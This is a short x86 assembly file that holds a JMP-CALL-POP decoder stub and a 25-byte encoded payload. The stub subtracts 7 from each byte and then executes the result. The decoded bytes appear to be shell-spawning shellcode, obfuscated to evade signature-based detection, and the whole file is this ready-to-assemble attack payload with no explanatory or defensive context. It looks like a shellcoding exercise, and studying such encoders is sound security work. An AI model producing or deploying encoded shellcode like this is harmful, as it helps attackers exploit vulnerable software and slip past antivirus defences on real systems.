; Swaroop Yermalkar

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:
	sub byte [esi], 0x7
	inc esi
	loop decode

	jmp short Shellcode

call_decoder:

	call decoder
	Shellcode: db 0x38,0xc7,0x57,0x6f,0x75,0x36,0x7a,0x6f,0x6f,0x36,0x36,0x69,0x70,0x90,0xea,0x57,0x90,0xe8,0x5a,0x90,0xe9,0xb7,0x12,0xd4,0x87

